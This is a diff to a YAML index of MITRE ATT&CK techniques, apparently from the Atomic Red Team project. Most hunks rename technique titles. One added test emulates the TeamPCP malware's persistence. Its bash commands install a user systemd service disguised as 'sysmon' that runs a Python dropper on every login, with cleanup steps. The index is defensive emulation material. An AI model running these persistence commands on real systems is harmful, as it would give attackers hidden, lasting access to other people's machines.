@@ -277,7 +277,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: 'Signed Binary Proxy Execution: Rundll32'
+      name: 'System Binary Proxy Execution: Rundll32'
       description: "Adversaries may abuse rundll32.exe to proxy execution of malicious
         code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)),
         may avoid triggering security tools that may not monitor execution of the
@@ -432,7 +432,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: File/Path Exclusions
+      name: 'Hide Artifacts: File/Path Exclusions'
       description: |-
         Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)
 
@@ -451,6 +451,7 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
+      identifier: T1564.012
     atomic_tests: []
   T1216.001:
     technique:
@@ -474,7 +475,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: 'Signed Script Proxy Execution: Pubprn'
+      name: 'System Script Proxy Execution: PubPrn'
       description: |-
         Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)
 
@@ -1432,7 +1433,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.622Z'
-      name: 'Masquerading: Match Legitimate Name or Location'
+      name: 'Masquerading: Match Legitimate Resource Name or Location'
       description: "Adversaries may match or approximate the name or location of legitimate
         files, Registry keys, or other resources when naming/placing them. This is
         done for the sake of evading defenses and observation. \n\nThis may be done
@@ -1784,7 +1785,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.623Z'
-      name: 'Signed Binary Proxy Execution: InstallUtil'
+      name: 'System Binary Proxy Execution: InstallUtil'
       description: |-
         Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.
 
@@ -2127,7 +2128,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.626Z'
-      name: 'Signed Binary Proxy Execution: Msiexec'
+      name: 'System Binary Proxy Execution: Msiexec'
       description: |-
         Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.
 
@@ -2250,7 +2251,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.627Z'
-      name: 'Indicator Removal on Host: Clear Command History'
+      name: 'Indicator Removal: Clear Command History'
       description: "In addition to clearing system logs, an adversary may clear the
         command history of a compromised account to conceal the actions undertaken
         during an intrusion. Various command interpreters keep track of the commands
@@ -2917,7 +2918,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.629Z'
-      name: Thread Execution Hijacking
+      name: 'Process Injection: Thread Execution Hijacking'
       description: "Adversaries may inject malicious code into hijacked processes
         in order to evade process-based defenses as well as possibly elevate privileges.
         Thread Execution Hijacking is a method of executing arbitrary code in the
@@ -3112,7 +3113,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.629Z'
-      name: 'Email Collection: Mailbox Manipulation'
+      name: 'Indicator Removal: Clear Mailbox Data'
       description: "Adversaries may modify mail and mail application data to remove
         evidence of their activity. Email applications allow users and other programs
         to export and delete mailbox data via command line tools or use of APIs. Mail
@@ -3361,7 +3362,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.629Z'
-      name: Signed Binary Proxy Execution
+      name: System Binary Proxy Execution
       description: |-
         Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.
 
@@ -3425,7 +3426,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.630Z'
-      name: 'Indicator Removal on Host: Timestomp'
+      name: 'Indicator Removal: Timestomp'
       description: |-
         Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.
 
@@ -3792,7 +3793,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.630Z'
-      name: Time Based Evasion
+      name: 'Virtualization/Sandbox Evasion: Time Based Checks'
       description: "Adversaries may employ various time-based methods to detect virtualization
         and analysis environments, particularly those that attempt to manipulate time
         mechanisms to simulate longer elapses of time. This may include enumerating
@@ -3887,7 +3888,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.631Z'
-      name: 'Signed Binary Proxy Execution: CMSTP'
+      name: 'System Binary Proxy Execution: CMSTP'
       description: |-
         Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.
 
@@ -3945,7 +3946,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.632Z'
-      name: 'Signed Binary Proxy Execution: Control Panel'
+      name: 'System Binary Proxy Execution: Control Panel'
       description: |-
         Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.
 
@@ -4496,7 +4497,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.636Z'
-      name: 'Hijack Execution Flow: LD_PRELOAD'
+      name: 'Hijack Execution Flow: Dynamic Linker Hijacking'
       description: |-
         Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)
 
@@ -4668,7 +4669,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.639Z'
-      name: Create Process with Token
+      name: 'Access Token Manipulation: Create Process with Token'
       description: |-
         Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)
 
@@ -4725,7 +4726,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.640Z'
-      name: 'Signed Binary Proxy Execution: Odbcconf'
+      name: 'System Binary Proxy Execution: Odbcconf'
       description: "Adversaries may abuse odbcconf.exe to proxy execution of malicious
         payloads. Odbcconf.exe is a Windows utility that allows you to configure Open
         Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft
@@ -4951,7 +4952,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.643Z'
-      name: Masquerading:Right-to-Left Override
+      name: 'Masquerading: Right-to-Left Override'
       description: |-
         Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)
 
@@ -5002,7 +5003,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.643Z'
-      name: SVG Smuggling
+      name: 'Obfuscated Files or Information: SVG Smuggling'
       description: "Adversaries may smuggle data and files past content filters by
         hiding malicious payloads inside of seemingly benign SVG files.(Citation:
         Trustwave SVG Smuggling 2025) SVGs, or Scalable Vector Graphics, are vector-based
@@ -5037,6 +5038,7 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
+      identifier: T1027.017
     atomic_tests: []
   T1542.002:
     technique:
@@ -5088,7 +5090,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.643Z'
-      name: Indicator Removal on Host
+      name: Indicator Removal
       description: |-
         Adversaries may selectively delete or modify artifacts generated to reduce indications of their presence and blend in with legitimate activity. Rather than broadly removing evidence, adversaries may target specific artifacts that appear anomalous or are likely to draw scrutiny, while leaving sufficient data intact to maintain the appearance of normal system behavior.
 
@@ -5641,7 +5643,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.676Z'
-      name: 'Signed Binary Proxy Execution: Mshta'
+      name: 'System Binary Proxy Execution: Mshta'
       description: "Adversaries may abuse mshta.exe to proxy execution of malicious
         .hta files and Javascript or VBScript through a trusted Windows utility. There
         are several examples of different types of threats leveraging mshta.exe during
@@ -6470,7 +6472,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.706Z'
-      name: 'Signed Binary Proxy Execution: Compiled HTML File'
+      name: 'System Binary Proxy Execution: Compiled HTML File'
       description: |-
         Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)
 
@@ -6508,7 +6510,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.706Z'
-      name: 'Indicator Removal on Host: Network Share Connection Removal'
+      name: 'Indicator Removal: Network Share Connection Removal'
       description: 'Adversaries may remove share connections that are no longer useful
         in order to clean up traces of their operation. Windows shared drive and [SMB/Windows
         Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can
@@ -7043,7 +7045,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.709Z'
-      name: Run Virtual Instance
+      name: 'Hide Artifacts: Run Virtual Instance'
       description: |-
         Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)
 
@@ -7224,7 +7226,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.709Z'
-      name: 'Signed Binary Proxy Execution: Regsvr32'
+      name: 'System Binary Proxy Execution: Regsvr32'
       description: |-
         Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)
 
@@ -7285,7 +7287,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.713Z'
-      name: 'Masquerading: Rename System Utilities'
+      name: 'Masquerading: Rename Legitimate Utilities'
       description: 'Adversaries may rename legitimate / system utilities to try to
         evade security mechanisms concerning the usage of those utilities. Security
         monitoring and control mechanisms may be in place for legitimate utilities
@@ -7517,7 +7519,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.714Z'
-      name: 'Signed Binary Proxy Execution: Regsvcs/Regasm'
+      name: 'System Binary Proxy Execution: Regsvcs/Regasm'
       description: |-
         Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)
 
@@ -8627,7 +8629,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.717Z'
-      name: HTML Smuggling
+      name: 'Obfuscated Files or Information: HTML Smuggling'
       description: |-
         Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)
 
@@ -8752,7 +8754,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.718Z'
-      name: 'Indicator Removal on Host: File Deletion'
+      name: 'Indicator Removal: File Deletion'
       description: |-
         Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.
 
@@ -10174,7 +10176,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.724Z'
-      name: Signed Script Proxy Execution
+      name: System Script Proxy Execution
       description: 'Adversaries may use trusted scripts, often signed with certificates,
         to proxy the execution of malicious files. Several Microsoft signed scripts
         that have been downloaded from Microsoft or are default on Windows installations
@@ -11348,7 +11350,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:25.363Z'
-      name: Kubernetes Cronjob
+      name: 'Scheduled Task/Job: Container Orchestration Job'
       description: |-
         Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.
 
@@ -11716,7 +11718,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:31.226Z'
-      name: Active Setup
+      name: 'Boot or Logon Autostart Execution: Active Setup'
       description: |-
         Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.
 
@@ -11770,7 +11772,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.623Z'
-      name: Domain Trust Modification
+      name: 'Domain or Tenant Policy Modification: Trust Modification'
       description: "Adversaries may add new domain trusts, modify the properties of
         existing domain trusts, or otherwise change the configuration of trust relationships
         between domains and tenants to evade defenses and/or elevate privileges.Trust
@@ -12469,7 +12471,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.629Z'
-      name: Thread Execution Hijacking
+      name: 'Process Injection: Thread Execution Hijacking'
       description: "Adversaries may inject malicious code into hijacked processes
         in order to evade process-based defenses as well as possibly elevate privileges.
         Thread Execution Hijacking is a method of executing arbitrary code in the
@@ -12660,7 +12662,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:42.963Z'
-      name: 'Boot or Logon Initialization Scripts: Logon Script (Mac)'
+      name: 'Boot or Logon Initialization Scripts: Login Hook'
       description: "Adversaries may use a Login Hook to establish persistence executed
         upon user logon. A login hook is a plist file that points to a specific script
         to execute with root privileges upon user logon. The plist file is located
@@ -13033,7 +13035,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.635Z'
-      name: 'Domain Policy Modification: Group Policy Modification'
+      name: 'Domain or Tenant Policy Modification: Group Policy Modification'
       description: "Adversaries may modify Group Policy Objects (GPOs) to subvert
         the intended discretionary access controls for a domain, usually with the
         intention of escalating privileges on the domain. Group policy allows for
@@ -13191,7 +13193,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:51.278Z'
-      name: Time Providers
+      name: 'Boot or Logon Autostart Execution: Time Providers'
       description: |-
         Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)
 
@@ -13438,7 +13440,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.639Z'
-      name: Create Process with Token
+      name: 'Access Token Manipulation: Create Process with Token'
       description: |-
         Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)
 
@@ -13835,7 +13837,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.640Z'
-      name: SSH Authorized Keys
+      name: 'Account Manipulation: SSH Authorized Keys'
       description: "Adversaries may modify the SSH <code>authorized_keys</code> file
         to maintain persistence on a victim host. Linux distributions, macOS, and
         ESXi hypervisors commonly use key-based authentication to secure the authentication
@@ -15939,6 +15941,7 @@ privilege-escalation:
       - macOS
       - Windows
       x_mitre_version: '1.6'
+      identifier: T1068
     atomic_tests: []
   T1546:
     technique:
@@ -16078,7 +16081,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.709Z'
-      name: 'Event Triggered Execution: .bash_profile .bashrc and .shrc'
+      name: 'Event Triggered Execution: Unix Shell Configuration Modification'
       description: "Adversaries may establish persistence through executing malicious
         commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s
         execute several configuration scripts at different points throughout the session
@@ -16433,7 +16436,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:17.208Z'
-      name: Authentication Package
+      name: 'Boot or Logon Autostart Execution: Authentication Package'
       description: |-
         Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)
 
@@ -17498,7 +17501,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:28.955Z'
-      name: 'Boot or Logon Initialization Scripts: Rc.common'
+      name: 'Boot or Logon Initialization Scripts: RC Scripts'
       description: |-
         Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.
 
@@ -17663,7 +17666,7 @@ privilege-escalation:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.722Z'
-      name: 'Create or Modify System Process: SysV/Systemd Service'
+      name: 'Create or Modify System Process: Systemd Service'
       description: "Adversaries may create or modify systemd services to repeatedly
         execute malicious payloads as part of persistence. Systemd is a system and
         service manager commonly used for managing background daemon processes (also
@@ -17872,6 +17875,68 @@ privilege-escalation:
           systemctl disable T1543.002
           rm -rf /etc/init.d/T1543.002
           systemctl daemon-reload
+    - name: TeamPCP Aqua Trivy Persistence
+      auto_generated_guid: a29738b0-0e14-488c-984f-6a851fcdbcfe
+      description: |
+        Simulates the persistence mechanism used by TeamPCP malware distributed via a hijacked
+        Aqua Trivy binary. Installs a user-level systemd service (sysmon) that drops a
+        Python script to ~/.config/systemd/user/sysmon.py. The script writes a second-stage
+        payload to #{pglog_path} and executes it in a new session. In the wild, the dropper polls
+        an ICP-hosted C2 canister for a download URL; this test creates the payload unconditionally
+        to avoid external network contact. Filepaths and names match observed IOCs.
+
+        Reference: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
+      supported_platforms:
+      - linux
+      input_arguments:
+        pglog_path:
+          description: Path where the dropper writes and executes the second-stage
+            payload
+          type: path
+          default: "/tmp/pglog"
+        sysmon_script_path:
+          description: Path to the sysmon Python script copied into the user systemd
+            directory
+          type: path
+          default: "$PathToAtomicsFolder/T1543.002/src/sysmon.py"
+      dependencies:
+      - description: python3 must be installed
+        prereq_command: 'which python3 > /dev/null 2>&1
+
+          '
+        get_prereq_command: 'apt-get install -y python3 2>/dev/null || yum install
+          -y python3 2>/dev/null
+
+          '
+      dependency_executor_name: bash
+      executor:
+        name: bash
+        elevation_required: false
+        command: |
+          mkdir -p $HOME/.config/systemd/user
+          cp "#{sysmon_script_path}" "$HOME/.config/systemd/user/sysmon.py"
+          echo "[Unit]" > $HOME/.config/systemd/user/sysmon.service
+          echo "Description=System Monitor Service" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Service]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Type=simple" >> $HOME/.config/systemd/user/sysmon.service
+          echo "ExecStart=/usr/bin/python3 $HOME/.config/systemd/user/sysmon.py \"#{pglog_path}\"" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Restart=always" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Install]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "WantedBy=default.target" >> $HOME/.config/systemd/user/sysmon.service
+          systemctl --user daemon-reload
+          systemctl --user enable sysmon.service
+          systemctl --user start sysmon.service
+          loginctl enable-linger $USER
+        cleanup_command: |
+          systemctl --user stop sysmon.service
+          systemctl --user disable sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.py
+          rm -f #{pglog_path}
+          systemctl --user daemon-reload
+          loginctl disable-linger $USER
   T1547.013:
     technique:
       type: attack-pattern
@@ -19244,7 +19309,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:22.302Z'
-      name: Server Software Component
+      name: Shared Modules
       description: |-
         Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).
 
@@ -19453,7 +19518,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:25.363Z'
-      name: Kubernetes Cronjob
+      name: 'Scheduled Task/Job: Container Orchestration Job'
       description: |-
         Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.
 
@@ -21161,7 +21226,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.634Z'
-      name: Deploy a container
+      name: Deploy Container
       description: |-
         Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)
 
@@ -21304,7 +21369,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.636Z'
-      name: 'Hijack Execution Flow: LD_PRELOAD'
+      name: 'Hijack Execution Flow: Dynamic Linker Hijacking'
       description: |-
         Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)
 
@@ -21732,7 +21797,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:59.945Z'
-      name: Kubernetes Exec Into Container
+      name: Container Administration Command
       description: |-
         Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)
 
@@ -22478,7 +22543,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.707Z'
-      name: 'Command and Scripting Interpreter: Bash'
+      name: 'Command and Scripting Interpreter: Unix Shell'
       description: |-
